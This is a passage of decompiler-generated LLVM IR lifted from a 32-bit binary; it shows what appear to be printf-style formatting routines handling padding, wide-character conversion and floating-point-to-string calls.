  %v0_80515ca = phi i32 [ %v1_8051535, %dec_label_pc_805155f ], [ %v1_8051535, %dec_label_pc_8051519 ], [ %v1_8051535, %dec_label_pc_805155b ], [ %v0_8051568.pre, %dec_label_pc_8051546 ], [ %v1_8051535, %dec_label_pc_8051563 ]
  %v1_8051568 = add i32 %v0_80515ca, 204
  store i32 %v1_8051568, i32* %ecx.global-to-local, align 4
  %v1_805156f = add i32 %v0_80515ca, 20
  %v2_805156f = inttoptr i32 %v1_805156f to i32*
  %v3_805156f = load i32, i32* %v2_805156f, align 4
  store i32 %v3_805156f, i32* %edx.global-to-local, align 4
  %v2_8051573 = sub i32 %v1_8051568, %v0_80515bb
  store i32 %v2_8051573, i32* %ecx.global-to-local, align 4
  %v2_8051575 = icmp slt i32 %v3_805156f, 0
  %v1_8051577 = add i32 %v2_8051573, 127
  store i32 %v1_8051577, i32* @esi, align 4
  %v1_805157a = icmp eq i1 %v2_8051575, false
  br i1 %v1_805157a, label %dec_label_pc_8051581, label %dec_label_pc_805157c

dec_label_pc_805157c:                             ; preds = %dec_label_pc_8051568
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051581

dec_label_pc_8051581:                             ; preds = %dec_label_pc_8051568, %dec_label_pc_805157c
  %v0_80515a7 = phi i32 [ %v3_805156f, %dec_label_pc_8051568 ], [ 1, %dec_label_pc_805157c ]
  %v1_8051581 = add i32 %v0_80515ca, 32
  %v2_8051581 = inttoptr i32 %v1_8051581 to i8*
  %v3_8051581 = load i8, i8* %v2_8051581, align 1
  %v4_8051581 = and i8 %v3_8051581, 16
  %v5_8051581 = icmp eq i8 %v4_8051581, 0
  br i1 %v5_8051581, label %dec_label_pc_80515bb, label %dec_label_pc_8051588

dec_label_pc_8051588:                             ; preds = %dec_label_pc_8051581
  %v1_8051588 = add i32 %v0_80515ca, 48
  %v2_8051588 = inttoptr i32 %v1_8051588 to i32*
  %v3_8051588 = load i32, i32* %v2_8051588, align 4
  store i32 %v3_8051588, i32* %eax.global-to-local, align 4
  %tmp97 = icmp ult i32 %v3_8051588, 3
  br i1 %tmp97, label %dec_label_pc_80515a2.thread, label %dec_label_pc_8051596

dec_label_pc_80515a2.thread:                      ; preds = %dec_label_pc_8051588
  store i32 6, i32* @ebp, align 4
  br label %dec_label_pc_80515bb

dec_label_pc_8051596:                             ; preds = %dec_label_pc_8051588
  %v9_8051596 = icmp eq i32 %v3_8051588, 3
  %v1_8051599 = icmp eq i1 %v9_8051596, false
  br i1 %v1_8051599, label %dec_label_pc_80515a2, label %dec_label_pc_805159b

dec_label_pc_805159b:                             ; preds = %dec_label_pc_8051596
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_80515bb

dec_label_pc_80515a2:                             ; preds = %dec_label_pc_8051596
  %v9_80515a2 = icmp eq i32 %v3_8051588, 4
  %v1_80515a5 = icmp eq i1 %v9_80515a2, false
  br i1 %v1_80515a5, label %dec_label_pc_80515bb, label %dec_label_pc_80515a7

dec_label_pc_80515a7:                             ; preds = %dec_label_pc_80515a2
  %tmp98 = icmp ugt i32 %v0_80515a7, %v1_8051577
  br i1 %tmp98, label %dec_label_pc_80515bb, label %dec_label_pc_80515ab

dec_label_pc_80515ab:                             ; preds = %dec_label_pc_80515a7
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_80515b0 = inttoptr i32 %v0_80515bb to i8*
  %v2_80515b0 = load i8, i8* %v1_80515b0, align 1
  %v8_80515b0 = icmp eq i8 %v2_80515b0, 48
  br i1 %v8_80515b0, label %dec_label_pc_80515bb, label %dec_label_pc_80515b5

dec_label_pc_80515b5:                             ; preds = %dec_label_pc_80515ab
  %v1_80515b5 = add i32 %v2_8051573, 128
  store i32 %v1_80515b5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80515bb

dec_label_pc_80515bb:                             ; preds = %dec_label_pc_80515a2.thread, %dec_label_pc_80515a7, %dec_label_pc_80515ab, %dec_label_pc_80515a2, %dec_label_pc_8051581, %dec_label_pc_805159b, %dec_label_pc_80515b5
  %v0_80515f3 = phi i32 [ %v0_80515a7, %dec_label_pc_80515a7 ], [ 1, %dec_label_pc_80515ab ], [ %v0_80515a7, %dec_label_pc_80515a2 ], [ %v0_80515a7, %dec_label_pc_8051581 ], [ %v0_80515a7, %dec_label_pc_805159b ], [ %v1_80515b5, %dec_label_pc_80515b5 ], [ %v0_80515a7, %dec_label_pc_80515a2.thread ]
  %v1_80515bb = inttoptr i32 %v0_80515bb to i8*
  %v2_80515bb = load i8, i8* %v1_80515bb, align 1
  %v8_80515bb = icmp eq i8 %v2_80515bb, 48
  %v1_80515be = icmp eq i1 %v8_80515bb, false
  br i1 %v1_80515be, label %dec_label_pc_80515eb, label %dec_label_pc_80515c0

dec_label_pc_80515c0:                             ; preds = %dec_label_pc_80515bb
  %v0_80515c0 = load i32, i32* @ebp, align 4
  %v7_80515c3 = icmp sgt i32 %v0_80515c0, 5
  br i1 %v7_80515c3, label %dec_label_pc_80515c5, label %dec_label_pc_80515ca

dec_label_pc_80515c5:                             ; preds = %dec_label_pc_80515c0
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_80515ca

dec_label_pc_80515ca:                             ; preds = %dec_label_pc_80515c0, %dec_label_pc_80515c5
  %v1_80515ca = add i32 %v0_80515ca, 48
  %v2_80515ca = inttoptr i32 %v1_80515ca to i32*
  %v3_80515ca = load i32, i32* %v2_80515ca, align 4
  %v12_80515ca = icmp eq i32 %v3_80515ca, 1
  %v1_80515cf = icmp eq i1 %v12_80515ca, false
  br i1 %v1_80515cf, label %dec_label_pc_80515e0, label %dec_label_pc_80515d1

dec_label_pc_80515d1:                             ; preds = %dec_label_pc_80515ca
  store i32 ptrtoint ([6 x i8]* @global_var_8059838.479 to i32), i32* @edi, align 4
  store i32 5, i32* @esi, align 4
  br label %dec_label_pc_805175c

dec_label_pc_80515e0:                             ; preds = %dec_label_pc_80515ca
  %v1_80515e0 = icmp eq i32 %v0_80515f3, 0
  %v1_80515e2 = icmp eq i1 %v1_80515e0, false
  br i1 %v1_80515e2, label %dec_label_pc_80515eb, label %dec_label_pc_80515e4

dec_label_pc_80515e4:                             ; preds = %dec_label_pc_80515e0
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805175c

dec_label_pc_80515eb:                             ; preds = %dec_label_pc_80515e0, %dec_label_pc_80515bb
  %v2_80515eb = sub i32 %v0_80515f3, %v1_8051577
  %v7_80515eb = icmp ult i32 %v0_80515f3, %v1_8051577
  %v12_80515eb = icmp eq i32 %v2_80515eb, 0
  %v2_80515ed = or i1 %v7_80515eb, %v12_80515eb
  br i1 %v2_80515ed, label %dec_label_pc_805175c, label %dec_label_pc_80515f3

dec_label_pc_80515f3:                             ; preds = %dec_label_pc_80515eb
  store i32 %v2_80515eb, i32* @ebx, align 4
  br label %dec_label_pc_8051776

dec_label_pc_80515fc:                             ; preds = %dec_label_pc_8051492
  %tmp99 = icmp ult i32 %v3_8051464, 16
  br i1 %tmp99, label %dec_label_pc_8051601, label %dec_label_pc_8051646

dec_label_pc_8051601:                             ; preds = %dec_label_pc_80515fc
  %v1_8051601 = add i32 %v0_8051464.lcssa, 33
  %v2_8051601 = inttoptr i32 %v1_8051601 to i8*
  %v3_8051601 = load i8, i8* %v2_8051601, align 1
  %v4_8051601 = and i8 %v3_8051601, 8
  %v5_8051601 = icmp eq i8 %v4_8051601, 0
  %v1_8051606 = add i32 %v0_8051464.lcssa, 344
  %v2_8051606 = inttoptr i32 %v1_8051606 to i32*
  %v3_8051606 = load i32, i32* %v2_8051606, align 4
  store i32 %v3_8051606, i32* %edx.global-to-local, align 4
  br i1 %v5_8051601, label %dec_label_pc_8051613, label %dec_label_pc_805160f

dec_label_pc_805160f:                             ; preds = %dec_label_pc_8051601
  %v1_805160f = inttoptr i32 %v3_8051606 to x86_fp80*
  %v2_805160f = load x86_fp80, x86_fp80* %v1_805160f, align 4
  br label %dec_label_pc_8051615

dec_label_pc_8051613:                             ; preds = %dec_label_pc_8051601
  %v1_8051613 = inttoptr i32 %v3_8051606 to double*
  %v2_8051613 = load double, double* %v1_8051613, align 4
  %v3_8051613 = fpext double %v2_8051613 to x86_fp80
  br label %dec_label_pc_8051615

dec_label_pc_8051615:                             ; preds = %dec_label_pc_805160f, %dec_label_pc_8051613
  %storemerge5 = phi x86_fp80 [ %v2_805160f, %dec_label_pc_805160f ], [ %v3_8051613, %dec_label_pc_8051613 ]
  store x86_fp80 %storemerge5, x86_fp80* %st0.global-to-local, align 4
  %v0_8051615 = load i32, i32* @esi, align 4
  %v2_8051615 = add i32 %v0_8051464.lcssa, -4
  %v3_8051615 = inttoptr i32 %v2_8051615 to i32*
  store i32 %v0_8051615, i32* %v3_8051615, align 4
  %v0_8051616 = load i32, i32* @esi, align 4
  %v2_8051616 = add i32 %v0_8051464.lcssa, -8
  %v3_8051616 = inttoptr i32 %v2_8051616 to i32*
  store i32 %v0_8051616, i32* %v3_8051616, align 4
  %v1_8051617 = add i32 %v0_8051464.lcssa, -12
  %v2_8051617 = inttoptr i32 %v1_8051617 to i32*
  store i32 134550234, i32* %v2_8051617, align 4
  %v1_805161c = add i32 %v0_8051464.lcssa, 20
  store i32 %v1_805161c, i32* %eax.global-to-local, align 4
  %v2_8051620 = add i32 %v0_8051464.lcssa, -16
  %v3_8051620 = inttoptr i32 %v2_8051620 to i32*
  store i32 %v1_805161c, i32* %v3_8051620, align 4
  %v1_8051621 = add i32 %v0_8051464.lcssa, -28
  %v1_8051624 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_8051624 = inttoptr i32 %v1_8051621 to x86_fp80*
  store x86_fp80 %v1_8051624, x86_fp80* %v3_8051624, align 4
  %v1_8051627 = add i32 %v0_8051464.lcssa, 368
  %v2_8051627 = inttoptr i32 %v1_8051627 to i32*
  %v3_8051627 = load i32, i32* %v2_8051627, align 4
  %v5_8051627 = add i32 %v0_8051464.lcssa, -32
  %v6_8051627 = inttoptr i32 %v5_8051627 to i32*
  store i32 %v3_8051627, i32* %v6_8051627, align 4
  %v0_805162e = call i32 @_fpmaxtostr()
  store i32 %v0_805162e, i32* %eax.global-to-local, align 4
  %v0_8051633 = load i32, i32* @esp, align 4
  %v1_8051633 = add i32 %v0_8051633, 32
  %v2_8051636 = icmp slt i32 %v0_805162e, 0
  br i1 %v2_8051636, label %dec_label_pc_80518d7, label %dec_label_pc_805163e

dec_label_pc_805163e:                             ; preds = %dec_label_pc_8051615
  %v1_805163e = inttoptr i32 %v1_8051633 to i32*
  %v2_805163e = load i32, i32* %v1_805163e, align 4
  %v4_805163e = add i32 %v2_805163e, %v0_805162e
  store i32 %v4_805163e, i32* %v1_805163e, align 4
  %v0_80518c4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80518c4

dec_label_pc_8051646:                             ; preds = %dec_label_pc_80515fc
  %tmp100 = or i32 %v3_8051464, 1
  %tmp101 = icmp eq i32 %tmp100, 17
  br i1 %tmp101, label %dec_label_pc_805164f, label %dec_label_pc_80516e2

dec_label_pc_805164f:                             ; preds = %dec_label_pc_8051646
  %v9_8051646 = icmp eq i32 %v3_8051464, 17
  %v1_805164f = add i32 %v0_8051464.lcssa, 332
  %v2_805164f = inttoptr i32 %v1_805164f to i32*
  store i32 0, i32* %v2_805164f, align 4
  %v0_805165a = load i32, i32* @esp, align 4
  %v1_805165a = add i32 %v0_805165a, 344
  %v2_805165a = inttoptr i32 %v1_805165a to i32*
  %v3_805165a = load i32, i32* %v2_805165a, align 4
  store i32 %v3_805165a, i32* %edx.global-to-local, align 4
  %v1_8051661 = icmp eq i1 %v9_8051646, false
  br i1 %v1_8051661, label %dec_label_pc_80516ad, label %dec_label_pc_8051663

dec_label_pc_8051663:                             ; preds = %dec_label_pc_805164f
  %v1_8051663 = inttoptr i32 %v3_805165a to i32*
  %v2_8051663 = load i32, i32* %v1_8051663, align 4
  store i32 %v2_8051663, i32* %eax.global-to-local, align 4
  %v2_8051665 = add i32 %v0_805165a, 340
  %v3_8051665 = inttoptr i32 %v2_8051665 to i32*
  store i32 %v2_8051663, i32* %v3_8051665, align 4
  %v0_805166c = load i32, i32* %eax.global-to-local, align 4
  %v1_805166c = icmp eq i32 %v0_805166c, 0
  br i1 %v1_805166c, label %dec_label_pc_8051760, label %dec_label_pc_8051674

dec_label_pc_8051674:                             ; preds = %dec_label_pc_8051663
  %v0_8051674 = load i32, i32* @esp, align 4
  %v1_8051674 = add i32 %v0_8051674, 20
  %v2_8051674 = inttoptr i32 %v1_8051674 to i32*
  %v3_8051674 = load i32, i32* %v2_8051674, align 4
  store i32 %v3_8051674, i32* %eax.global-to-local, align 4
  %v2_805167b = icmp slt i32 %v3_8051674, 0
  br i1 %v2_805167b, label %dec_label_pc_8051681, label %dec_label_pc_805167f

dec_label_pc_805167f:                             ; preds = %dec_label_pc_8051674
  br label %dec_label_pc_8051681

dec_label_pc_8051681:                             ; preds = %dec_label_pc_8051674, %dec_label_pc_805167f
  %storemerge105 = phi i32 [ %v3_8051674, %dec_label_pc_805167f ], [ -1, %dec_label_pc_8051674 ]
  store i32 %storemerge105, i32* %ecx.global-to-local, align 4
  %v1_8051681 = add i32 %v0_8051674, 340
  store i32 %v1_8051681, i32* %edx.global-to-local, align 4
  %v1_8051688 = add i32 %v0_8051674, 332
  store i32 %v1_8051688, i32* %eax.global-to-local, align 4
  %v2_805168f = add i32 %v0_8051674, -4
  %v3_805168f = inttoptr i32 %v2_805168f to i32*
  store i32 %v1_8051688, i32* %v3_805168f, align 4
  %v0_8051690 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051690 = add i32 %v0_8051674, -8
  %v3_8051690 = inttoptr i32 %v2_8051690 to i32*
  store i32 %v0_8051690, i32* %v3_8051690, align 4
  %v0_8051691 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051691 = add i32 %v0_8051674, -12
  %v3_8051691 = inttoptr i32 %v2_8051691 to i32*
  store i32 %v0_8051691, i32* %v3_8051691, align 4
  %v0_8051692 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051692 = add i32 %v0_8051674, -16
  %v3_8051692 = inttoptr i32 %v2_8051692 to i32*
  store i32 %v0_8051692, i32* %v3_8051692, align 4
  %v0_8051693 = call i32 @__GI_wcsrtombs()
  store i32 %v0_8051693, i32* %eax.global-to-local, align 4
  %v0_8051698 = load i32, i32* @esp, align 4
  %v1_8051698 = add i32 %v0_8051698, 16
  store i32 %v0_8051693, i32* @esi, align 4
  %v10_805169d = icmp eq i32 %v0_8051693, -1
  br i1 %v10_805169d, label %dec_label_pc_80518d7, label %dec_label_pc_80516a6

dec_label_pc_80516a6:                             ; preds = %dec_label_pc_8051681
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_805176a

dec_label_pc_80516ad:                             ; preds = %dec_label_pc_805164f
  %v0_80516ad = load i32, i32* @ebx, align 4
  %v2_80516ad = add i32 %v0_805165a, -4
  %v3_80516ad = inttoptr i32 %v2_80516ad to i32*
  store i32 %v0_80516ad, i32* %v3_80516ad, align 4
  %v1_80516ae = add i32 %v0_805165a, 332
  store i32 %v1_80516ae, i32* %eax.global-to-local, align 4
  %v2_80516b5 = add i32 %v0_805165a, -8
  %v3_80516b5 = inttoptr i32 %v2_80516b5 to i32*
  store i32 %v1_80516ae, i32* %v3_80516b5, align 4
  %v0_80516b6 = load i32, i32* %edx.global-to-local, align 4
  %v1_80516b6 = inttoptr i32 %v0_80516b6 to i32*
  %v2_80516b6 = load i32, i32* %v1_80516b6, align 4
  %v4_80516b6 = add i32 %v0_805165a, -12
  %v5_80516b6 = inttoptr i32 %v4_80516b6 to i32*
  store i32 %v2_80516b6, i32* %v5_80516b6, align 4
  %v1_80516b8 = add i32 %v0_805165a, 204
  store i32 %v1_80516b8, i32* @ebx, align 4
  %v2_80516bf = add i32 %v0_805165a, -16
  %v3_80516bf = inttoptr i32 %v2_80516bf to i32*
  store i32 %v1_80516b8, i32* %v3_80516bf, align 4
  %v0_80516c0 = call i32 @__GI_wcrtomb()
  store i32 %v0_80516c0, i32* %eax.global-to-local, align 4
  %v0_80516c5 = load i32, i32* @esp, align 4
  %v1_80516c5 = add i32 %v0_80516c5, 16
  store i32 %v0_80516c0, i32* @esi, align 4
  %v10_80516ca = icmp eq i32 %v0_80516c0, -1
  br i1 %v10_80516ca, label %dec_label_pc_80518d7, label %dec_label_pc_80516d3

dec_label_pc_80516d3:                             ; preds = %dec_label_pc_80516ad
  %v0_80516d3 = load i32, i32* @ebx, align 4
  store i32 %v0_80516d3, i32* @edi, align 4
  %v2_80516d5 = add i32 %v0_80516c0, 220
  %v3_80516d5 = add i32 %v2_80516d5, %v0_80516c5
  %v4_80516d5 = inttoptr i32 %v3_80516d5 to i8*
  store i8 0, i8* %v4_80516d5, align 1
  br label %dec_label_pc_805176a

dec_label_pc_80516e2:                             ; preds = %dec_label_pc_8051646
  %tmp102 = icmp ult i32 %v3_8051464, 20
  br i1 %tmp102, label %dec_label_pc_80516e7, label %dec_label_pc_8051732

dec_label_pc_80516e7:                             ; preds = %dec_label_pc_80516e2
  %v9_80516e2 = icmp eq i32 %v3_8051464, 19
  %v1_80516e7 = add i32 %v0_8051464.lcssa, 344
  %v2_80516e7 = inttoptr i32 %v1_80516e7 to i32*
  %v3_80516e7 = load i32, i32* %v2_80516e7, align 4
  store i32 %v3_80516e7, i32* %edx.global-to-local, align 4
  %v1_80516ee = icmp eq i1 %v9_80516e2, false
  %v1_8051713 = inttoptr i32 %v3_80516e7 to i32*
  %v2_8051713 = load i32, i32* %v1_8051713, align 4
  br i1 %v1_80516ee, label %dec_label_pc_8051713, label %dec_label_pc_80516f0

dec_label_pc_80516f0:                             ; preds = %dec_label_pc_80516e7
  store i32 %v2_8051713, i32* @edi, align 4
  %v1_80516f2 = icmp eq i32 %v2_8051713, 0
  br i1 %v1_80516f2, label %dec_label_pc_8051760, label %dec_label_pc_80516f6

dec_label_pc_80516f6:                             ; preds = %dec_label_pc_80516f0, %dec_label_pc_805173b
  %v1_8051703 = phi i32 [ %v0_8051464.lcssa, %dec_label_pc_80516f0 ], [ %v1_8051755, %dec_label_pc_805173b ]
  %v1_80516f6 = add i32 %v1_8051703, 20
  %v2_80516f6 = inttoptr i32 %v1_80516f6 to i32*
  %v3_80516f6 = load i32, i32* %v2_80516f6, align 4
  store i32 %v3_80516f6, i32* %eax.global-to-local, align 4
  %v2_80516fd = icmp slt i32 %v3_80516f6, 0
  br i1 %v2_80516fd, label %dec_label_pc_8051703, label %dec_label_pc_8051701

dec_label_pc_8051701:                             ; preds = %dec_label_pc_80516f6
  br label %dec_label_pc_8051703

dec_label_pc_8051703:                             ; preds = %dec_label_pc_80516f6, %dec_label_pc_8051701
  %storemerge = phi i32 [ %v3_80516f6, %dec_label_pc_8051701 ], [ -1, %dec_label_pc_80516f6 ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v2_8051703 = add i32 %v1_8051703, -4
  %v3_8051703 = inttoptr i32 %v2_8051703 to i32*
  store i32 %v3_8051464, i32* %v3_8051703, align 4
  %v2_8051704 = add i32 %v1_8051703, -8
  %v3_8051704 = inttoptr i32 %v2_8051704 to i32*
  store i32 %v3_8051464, i32* %v3_8051704, align 4
  %v0_8051705 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051705 = add i32 %v1_8051703, -12
  %v3_8051705 = inttoptr i32 %v2_8051705 to i32*
  store i32 %v0_8051705, i32* %v3_8051705, align 4
  %v0_8051706 = load i32, i32* @edi, align 4
  %v2_8051706 = add i32 %v1_8051703, -16
  %v3_8051706 = inttoptr i32 %v2_8051706 to i32*
  store i32 %v0_8051706, i32* %v3_8051706, align 4
  %v0_8051707 = call i32 @strnlen()
  store i32 %v0_8051707, i32* %eax.global-to-local, align 4
  store i32 %v0_8051707, i32* @esi, align 4
  br label %dec_label_pc_805176a

dec_label_pc_8051713:                             ; preds = %dec_label_pc_80516e7
  store i32 %v2_8051713, i32* %eax.global-to-local, align 4
  %v1_8051715 = add i32 %v0_8051464.lcssa, 204
  store i32 %v1_8051715, i32* @edi, align 4
  store i32 1, i32* @esi, align 4
  %v1_8051721 = trunc i32 %v2_8051713 to i8
  %v4_8051721 = inttoptr i32 %v1_8051715 to i8*
  store i8 %v1_8051721, i8* %v4_8051721, align 1
  %v0_8051728 = load i32, i32* @esp, align 4
  %v1_8051728 = add i32 %v0_8051728, 205
  %v2_8051728 = inttoptr i32 %v1_8051728 to i8*
  store i8 0, i8* %v2_8051728, align 1
  br label %dec_label_pc_805176a

dec_label_pc_8051732:                             ; preds = %dec_label_pc_80516e2
  %v9_8051732 = icmp eq i32 %v3_8051464, 20
  %v1_8051735 = icmp eq i1 %v9_8051732, false
  br i1 %v1_8051735, label %dec_label_pc_80518d7, label %dec_label_pc_805173b

dec_label_pc_805173b:                             ; preds = %dec_label_pc_8051732
  %v0_805173b = load i32, i32* %stack_var_-364, align 4
  %v1_805173b = call i32 @__errno_location(i32 %v0_805173b)
  store i32 %v1_805173b, i32* %eax.global-to-local, align 4
  %v0_8051740 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051740 = load i32, i32* @esp, align 4
  %v2_8051740 = add i32 %v1_8051740, -4
  %v3_8051740 = inttoptr i32 %v2_8051740 to i32*
  store i32 %v0_8051740, i32* %v3_8051740, align 4
  %v1_8051741 = add i32 %v1_8051740, -8
  %v2_8051741 = inttoptr i32 %v1_8051741 to i32*
  store i32 128, i32* %v2_8051741, align 4
  %v1_8051746 = add i32 %v1_8051740, 204
  store i32 %v1_8051746, i32* %edx.global-to-local, align 4
  %v2_805174d = add i32 %v1_8051740, -12
  %v3_805174d = inttoptr i32 %v2_805174d to i32*
  store i32 %v1_8051746, i32* %v3_805174d, align 4
  %v1_805174e = inttoptr i32 %v1_805173b to i32*
  %v2_805174e = load i32, i32* %v1_805174e, align 4
  %v4_805174e = add i32 %v1_8051740, -16
  %v5_805174e = inttoptr i32 %v4_805174e to i32*
  store i32 %v2_805174e, i32* %v5_805174e, align 4
  %v0_8051750 = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_8051750, i32* %eax.global-to-local, align 4
  %v0_8051755 = load i32, i32* @esp, align 4
  %v1_8051755 = add i32 %v0_8051755, 16
  store i32 %v0_8051750, i32* @edi, align 4
  br label %dec_label_pc_80516f6

dec_label_pc_805175c:                             ; preds = %dec_label_pc_80515eb, %dec_label_pc_80515e4, %dec_label_pc_80515d1
  %v0_805177637 = phi i32 [ %v1_8051577, %dec_label_pc_80515eb ], [ 0, %dec_label_pc_80515e4 ], [ 5, %dec_label_pc_80515d1 ]
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8051776

dec_label_pc_8051760:                             ; preds = %dec_label_pc_80516f0, %dec_label_pc_8051663
  store i32 ptrtoint ([7 x i8]* @global_var_805983e.480 to i32), i32* @edi, align 4
  store i32 6, i32* @esi, align 4
  br label %dec_label_pc_805176a

dec_label_pc_805176a:                             ; preds = %dec_label_pc_8051713, %dec_label_pc_8051703, %dec_label_pc_80516d3, %dec_label_pc_80516a6, %dec_label_pc_8051760
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v0_8051771 = load i32, i32* @esp, align 4
  %v1_8051771 = add i32 %v0_8051771, 7
  %v2_8051771 = inttoptr i32 %v1_8051771 to i8*
  store i8 32, i8* %v2_8051771, align 1
  %v0_8051776.pre = load i32, i32* @esi, align 4
  %v1_8051776.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051776

dec_label_pc_8051776:                             ; preds = %dec_label_pc_805175c, %dec_label_pc_80515f3, %dec_label_pc_805176a
  %v1_8051776 = phi i32 [ 0, %dec_label_pc_805175c ], [ %v2_80515eb, %dec_label_pc_80515f3 ], [ %v1_8051776.pre, %dec_label_pc_805176a ]
  %v0_8051776 = phi i32 [ %v0_805177637, %dec_label_pc_805175c ], [ %v1_8051577, %dec_label_pc_80515f3 ], [ %v0_8051776.pre, %dec_label_pc_805176a ]
  %v2_8051776 = add i32 %v0_8051776, %v1_8051776
  store i32 %v2_8051776, i32* @edx, align 4
  %v0_8051779 = load i32, i32* @ebp, align 4
  %v9_8051779 = icmp eq i32 %v0_8051779, 11
  br i1 %v9_8051779, label %dec_label_pc_805178a, label %dec_label_pc_805177e

dec_label_pc_805177e:                             ; preds = %dec_label_pc_8051776
  %v1_8051780 = add i32 %v0_8051779, -5
  %v6_8051780 = sub i32 4, %v0_8051779
  %v7_8051780 = and i32 %v6_8051780, %v0_8051779
  %v8_8051780 = icmp slt i32 %v7_8051780, 0
  %v9_8051780 = icmp eq i32 %v1_8051780, 0
  %v10_8051780 = icmp slt i32 %v1_8051780, 0
  %v3_8051783 = icmp eq i1 %v10_8051780, %v8_8051780
  %v4_8051783 = icmp eq i1 %v9_8051780, false
  %v5_8051783 = and i1 %v4_8051783, %v3_8051783
  %v6_8051783 = zext i1 %v5_8051783 to i32
  store i32 %v6_8051783, i32* %eax.global-to-local, align 4
  %v2_8051786 = add i32 %v2_8051776, 1
  %v3_8051786 = add i32 %v2_8051786, %v6_8051783
  store i32 %v3_8051786, i32* @edx, align 4
  br label %dec_label_pc_805178a

dec_label_pc_805178a:                             ; preds = %dec_label_pc_8051776, %dec_label_pc_805177e
  %v0_805178a = load i32, i32* @esp, align 4
  %v1_805178a = add i32 %v0_805178a, 24
  %v2_805178a = inttoptr i32 %v1_805178a to i32*
  %v3_805178a = load i32, i32* %v2_805178a, align 4
  store i32 %v3_805178a, i32* %eax.global-to-local, align 4
  %v1_805178e = add i32 %v0_805178a, 8
  %v2_805178e = inttoptr i32 %v1_805178e to i32*
  store i32 0, i32* %v2_805178e, align 4
  %v0_8051796 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051796 = load i32, i32* @edx, align 4
  %v2_8051796 = sub i32 %v0_8051796, %v1_8051796
  %v7_8051796 = icmp ult i32 %v0_8051796, %v1_8051796
  %v12_8051796 = icmp eq i32 %v2_8051796, 0
  %v2_8051798 = or i1 %v7_8051796, %v12_8051796
  br i1 %v2_8051798, label %dec_label_pc_80517a0, label %dec_label_pc_805179a

dec_label_pc_805179a:                             ; preds = %dec_label_pc_805178a
  store i32 %v2_8051796, i32* %eax.global-to-local, align 4
  %v1_805179c = load i32, i32* @esp, align 4
  %v2_805179c = add i32 %v1_805179c, 8
  %v3_805179c = inttoptr i32 %v2_805179c to i32*
  store i32 %v2_8051796, i32* %v3_805179c, align 4
  %v0_80517a4.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80517a0

dec_label_pc_80517a0:                             ; preds = %dec_label_pc_805178a, %dec_label_pc_805179a
  %v0_80517a4 = phi i32 [ %v1_8051796, %dec_label_pc_805178a ], [ %v0_80517a4.pre, %dec_label_pc_805179a ]
  %v0_80517a0 = load i32, i32* @esp, align 4
  %v1_80517a0 = add i32 %v0_80517a0, 8
  %v2_80517a0 = inttoptr i32 %v1_80517a0 to i32*
  %v3_80517a0 = load i32, i32* %v2_80517a0, align 4
  store i32 %v3_80517a0, i32* @ecx, align 4
  %v2_80517a4 = add i32 %v3_80517a0, %v0_80517a4
  store i32 %v2_80517a4, i32* %eax.global-to-local, align 4
  %v1_80517a7 = inttoptr i32 %v0_80517a0 to i32*
  %v2_80517a7 = load i32, i32* %v1_80517a7, align 4
  %v4_80517a7 = add i32 %v2_80517a7, %v2_80517a4
  store i32 %v4_80517a7, i32* %v1_80517a7, align 4
  %v0_80517aa = load i32, i32* @esp, align 4
  %v1_80517aa = add i32 %v0_80517aa, 7
  %v2_80517aa = inttoptr i32 %v1_80517aa to i8*
  %v3_80517aa = load i8, i8* %v2_80517aa, align 1
  %v9_80517aa = icmp eq i8 %v3_80517aa, 48
  %v1_80517af = icmp eq i1 %v9_80517aa, false
  br i1 %v1_80517af, label %dec_label_pc_80517bb, label %dec_label_pc_80517b1

dec_label_pc_80517b1:                             ; preds = %dec_label_pc_80517a0
  %v0_80517b1 = load i32, i32* @ebx, align 4
  %v1_80517b1 = load i32, i32* @ecx, align 4
  %v2_80517b1 = add i32 %v1_80517b1, %v0_80517b1
  store i32 %v2_80517b1, i32* @ebx, align 4
  %v1_80517b3 = add i32 %v0_80517aa, 8
  %v2_80517b3 = inttoptr i32 %v1_80517b3 to i32*
  store i32 0, i32* %v2_80517b3, align 4
  %v0_80517bb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80517bb

dec_label_pc_80517bb:                             ; preds = %dec_label_pc_80517a0, %dec_label_pc_80517b1
  %v0_80517c2 = phi i32 [ %v0_80517aa, %dec_label_pc_80517a0 ], [ %v0_80517bb.pre, %dec_label_pc_80517b1 ]
  %v1_80517bb = add i32 %v0_80517c2, 32
  %v2_80517bb = inttoptr i32 %v1_80517bb to i8*
  %v3_80517bb = load i8, i8* %v2_80517bb, align 1
  %v4_80517bb = and i8 %v3_80517bb, 8
  %v5_80517bb = icmp eq i8 %v4_80517bb, 0
  %v1_80517c0 = icmp eq i1 %v5_80517bb, false
  br i1 %v1_80517c0, label %dec_label_pc_80517e9, label %dec_label_pc_80517c2

dec_label_pc_80517c2:                             ; preds = %dec_label_pc_80517bb
  %v1_80517c2 = add i32 %v0_80517c2, 8
  %v2_80517c2 = inttoptr i32 %v1_80517c2 to i32*
  %v3_80517c2 = load i32, i32* %v2_80517c2, align 4
  store i32 %v3_80517c2, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_80517cb = add i32 %v0_80517c2, 368
  %v2_80517cb = inttoptr i32 %v1_80517cb to i32*
  %v3_80517cb = load i32, i32* %v2_80517cb, align 4
  store i32 %v3_80517cb, i32* @eax, align 4
  %v0_80517d2 = call i32 @_charpad()
  store i32 %v0_80517d2, i32* %eax.global-to-local, align 4
